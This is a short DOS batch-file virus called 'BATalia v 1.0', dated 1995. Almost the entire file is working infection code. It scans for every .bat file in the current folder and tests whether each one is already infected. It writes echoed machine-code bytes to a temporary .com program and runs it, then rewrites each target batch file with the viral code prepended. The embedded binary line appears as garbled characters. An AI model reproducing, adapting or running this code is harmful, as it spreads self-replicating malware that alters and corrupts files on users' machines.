@echo off
rem YYY
rem "BATalia v 1.0" Written by Int O`Dream at 04.11.95 (Original algoritm)
if "its%1"=="itsmi" goto start
for %%b in (*.bat) do call %0 mi %%b
@echo on
@goto begin_program
:start
echo NNN >tmp.oba
copy %2 + tmp.oba tmp.psm>nul
echo 1 >tmp.ol1
echo 2 >tmp.ol2
echo 3 >tmp.ol3
del *.ol? /p <tmp.psm >nul
if exist tmp.ol1 goto infect
if exist tmp.ol2 goto infect
if exist tmp.ol3 goto infect
goto _end_virii
:infect
rem echo %2
copy %0 tmp.fi1>nul
echo 12 >tmp.fi2
echo :begin_program >tmp.beg
echo 
  >tmp.ent
echo :end_program >tmp.end
echo �=2����!�ش?�,�&�!�=2����!�ش@�,�&�!� >tmp.com
tmp.com tmp.fi1 tmp.fi2 
copy %2 tmp.tmp>nul
del %2>nul
copy tmp.fi2 + tmp.beg+ tmp.tmp +tmp.ent + tmp.end %2 >nul
:_end_virii
del tmp.* >nul
goto end_program
 


:begin_program
:end_program







